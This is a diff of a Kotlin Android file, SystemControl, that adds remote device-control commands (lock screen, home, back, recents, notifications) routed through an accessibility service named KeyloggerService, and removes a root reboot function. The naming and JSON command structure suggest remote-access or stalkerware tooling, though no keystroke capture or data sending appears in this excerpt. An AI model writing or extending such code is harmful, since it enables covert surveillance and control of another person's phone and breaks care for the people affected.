@@ -10,24 +10,51 @@ import org.json.JSONObject
 
 object SystemControl {
 
-    /** Lock the screen using DevicePolicyManager if admin, else fallback. */
     fun lockScreen(ctx: Context): JSONObject {
-        return try {
+        // 1) Accessibility service (no admin needed)
+        val acc = KeyloggerService.instance
+        if (acc != null) {
+            val ok = acc.lockScreen()
+            if (ok) return JSONObject().put("ok", true).put("method", "accessibility")
+        }
+
+        // 2) Device admin
+        try {
             val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val admin = ComponentName(ctx, AdminReceiver::class.java)
             if (dpm.isAdminActive(admin)) {
                 dpm.lockNow()
-                JSONObject().put("ok", true).put("method", "dpm")
-            } else {
-                // Fallback: use accessibility service if active
-                JSONObject().put("error", "device_admin_not_active — enable admin in-app")
+                return JSONObject().put("ok", true).put("method", "dpm")
             }
-        } catch (e: Exception) {
-            JSONObject().put("error", e.message ?: "lock_failed")
-        }
+        } catch (_: Exception) {}
+
+        return JSONObject().put("error", "no_lock_method - enable accessibility service")
     }
 
-    /** Launch any app by package name. */
+    fun goHome(): JSONObject {
+        val acc = KeyloggerService.instance
+            ?: return JSONObject().put("error", "accessibility_not_active")
+        return JSONObject().put("ok", acc.goHome())
+    }
+
+    fun back(): JSONObject {
+        val acc = KeyloggerService.instance
+            ?: return JSONObject().put("error", "accessibility_not_active")
+        return JSONObject().put("ok", acc.back())
+    }
+
+    fun recents(): JSONObject {
+        val acc = KeyloggerService.instance
+            ?: return JSONObject().put("error", "accessibility_not_active")
+        return JSONObject().put("ok", acc.recents())
+    }
+
+    fun openNotifications(): JSONObject {
+        val acc = KeyloggerService.instance
+            ?: return JSONObject().put("error", "accessibility_not_active")
+        return JSONObject().put("ok", acc.notifications())
+    }
+
     fun openApp(ctx: Context, pkg: String): JSONObject {
         return try {
             val intent = ctx.packageManager.getLaunchIntentForPackage(pkg)
@@ -42,7 +69,6 @@ object SystemControl {
         }
     }
 
-    /** Open URL in default browser. */
     fun openUrl(ctx: Context, url: String): JSONObject {
         return try {
             val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
@@ -54,7 +80,6 @@ object SystemControl {
         }
     }
 
-    /** Show screen-on wakelock for N ms. */
     fun wakeLock(ctx: Context, ms: Long): JSONObject {
         return try {
             val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
@@ -63,17 +88,6 @@ object SystemControl {
             JSONObject().put("ok", true).put("duration", ms)
         } catch (e: Exception) {
             JSONObject().put("error", e.message ?: "wakelock_failed")
-        }
-    }
-
-    /** Reboot (requires root). */
-    fun reboot(): JSONObject {
-        return try {
-            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
-            p.waitFor()
-            JSONObject().put("ok", true)
-        } catch (e: Exception) {
-            JSONObject().put("error", e.message ?: "reboot_failed")
         }
     }
 }
